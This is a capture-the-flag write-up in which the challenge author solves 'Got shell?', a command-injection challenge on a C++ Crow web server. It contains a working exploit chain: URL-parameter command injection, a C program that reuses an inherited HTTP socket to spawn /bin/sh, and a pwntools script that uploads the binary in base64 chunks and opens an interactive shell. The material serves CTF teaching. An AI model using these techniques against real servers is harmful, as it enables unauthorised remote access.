# Got shell?
- Points: 319
- Solves: 37
- Author: semchapeu

Can you get a shell? NOTE: The firewall does not allow outgoing traffic & There are no additional paths on the website.

# Solution

Visiting http://3.93.128.89:1224/ yields the following C++ code:

```C++
#include "crow_all.h"
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <sstream>

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        return std::string("Error");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

int main() {
    crow::SimpleApp app;
    app.loglevel(crow::LogLevel::Warning);

    CROW_ROUTE(app, "/")
    ([](const crow::request& req) {
        std::ostringstream os;
        if(req.url_params.get("cmd") != nullptr){
            os << exec(req.url_params.get("cmd"));
        } else {
            os << exec("cat ./source.html"); 
        }
        return crow::response{os.str()};
    });

    app.port(1224).multithreaded().run();
}
```

From this it becomes clear, that it is possible to run commands via the `cmd` URL parameter.

For example http://3.93.128.89:1224/?cmd=ls+-la;id results in:

```
total 44
drwxr-xr-x 1 root root      4096 Dec 24 11:56 .
drwxr-xr-x 1 root root      4096 Dec 24 11:56 ..
----r----- 1 root gotshell    38 Dec 24 08:32 flag
------s--x 1 root gotshell 17576 Dec  5 17:26 flag_reader
-rw-rw-r-- 1 root root     10459 Dec 24 08:32 source.html
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

From that we can see that we do not have read access to the `flag` file, but there is a `flag_reader` with setgid permissions.

Executing http://3.93.128.89:1224/?cmd=./flag_reader gives us:
```
Got shell?
741106133 + 1459419563 = Incorrect captcha :(
```

The `flag_reader` program expects the sum of two random numbers from stdin.
The main crux of this challenge is how to get these two numbers and input the sum back into the program, because the way commands are executed you only get the result of a command once it's finished executing.

`/tmp/` is world writeable but not world readable.

The CTF players came up with many clever methods. Some of their solutions included the use of FIFOs (`mkfifo`), Coprocesses (`coproc`) and uploading a program that does the interaction with the `flag_reader` on their behalf.

However as far as I know nobody managed to actually get an interactive shell, which is possible though.
So I will show how to get an interactive shell.


Running `ls -la /proc/$$/fd` shows that we inherit multiple sockets from our parent process. 
```
 total 0
dr-x------ 2 nobody nogroup  0 Dec 27 14:53 .
dr-xr-xr-x 9 nobody nogroup  0 Dec 27 14:53 ..
lr-x------ 1 nobody nogroup 64 Dec 27 14:53 0 -> /dev/null
l-wx------ 1 nobody nogroup 64 Dec 27 14:53 1 -> pipe:[82003624]
l-wx------ 1 nobody nogroup 64 Dec 27 14:53 2 -> /dev/null
lrwx------ 1 nobody nogroup 64 Dec 27 14:53 33 -> socket:[81999177]
lrwx------ 1 nobody nogroup 64 Dec 27 14:53 34 -> socket:[82003618]
lrwx------ 1 nobody nogroup 64 Dec 27 14:53 35 -> socket:[82003622]
lrwx------ 1 nobody nogroup 64 Dec 27 14:53 6 -> socket:[81225592]
```

The idea to get an interactive shell is to reuse the socket we used to send the HTTP request and use this channel to communicate with a shell.
During the peak time during the CTF it was possible to inherit hundreds of active sockets, so we need to find a way to identify the right socket.

I wrote a small program that takes care of this, and my solution script uploads and executes this program.

This program selects and reuses the socket and then spawns a shell.
```C
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>

const long public_ip = 0x7f000001; // 127.0.0.1, CHANGE THIS to your public ip! 

int main(int argc, const char *argv[]){
  struct sockaddr_in *s;
  socklen_t s_len = sizeof(s);
  long ip;

  for(int sock_fd=0; sock_fd<65536; sock_fd++){

    // finding sockets
    if(getpeername(sock_fd, (struct sockaddr*) &s, &s_len) != 0)
      continue;

    // checking IP connected to socket, to select the correct socket
    ip = ntohl(*(((int *)&s)+1));
    if(ip != public_ip)
        continue;

    // redirect fd's into socket
    for (int i=0; i<3; i++)    
     dup2(sock_fd, i); 

    // spawn shell
    char *arg[] = {"/bin/sh",0};
    execve("/bin/sh", arg, NULL);
  }

  puts("Not Found\n");

  return 0;
}
```

This script takes care of the rest:
```Python
#!/usr/bin/env python3
import requests
import readline
from pwn import *

host = "3.93.128.89"
port = 1224

url = "http://{}:{}/".format(host,port)

def run(cmd, redir_stderr=False):
	if redir_stderr:
		cmd += " 2>&1"
	params = {"cmd":cmd}
	r = requests.get(url,params=params)
	return r.text

def fake_shell():
	while True:
		cmd = input("> ").strip()
		if cmd == "exit":
			return
		print(run(cmd,redir_stderr=True))

def real_shell(executor):
	r = remote(host,port)
	request = "GET /?cmd={} HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: curl/7.66.0\r\nAccept: */*\r\n\r\n"
	r.send(request.format(executor,host,port))
	r.interactive()

def upload_file(ipath, opath):
	with open(ipath,'rb') as f:
		data = f.read()
	chunks = group(1024, data)
	for chunk in chunks:
		chunk = b64e(chunk)
		run("echo {} |base64 -d >> {}".format(chunk,opath))

# fake_shell()
tmp_dir = run("mktemp -d").strip()
print(tmp_dir)
tmp_file = tmp_dir+"/a.out"
upload_file("./a.out",tmp_file)
run("chmod +x {}".format(tmp_file))
real_shell(tmp_file)
run("rm -rf {}".format(tmp_dir))
#fake_shell()
```

Get a shell :D
```
$ python3 solution.py
/tmp/tmp.dK72FGfbXz
[+] Opening connection to 3.93.128.89 on port 1224: Done
[*] Switching to interactive mode
sh: turning off NDELAY mode
$ ls
flag
flag_reader
source.html
$ ./flag_reader
Got shell?
313937817 + 567834239 = $ 881772056
AOTW{d1d_y0u_g3t_4n_1n73r4c71v3_5h3ll}$ exit
HTTP/1.1 200 OK
Content-Length: 0
Server: Crow/0.1
Date: Fri, 27 Dec 2019 15:14:14 GMT
```
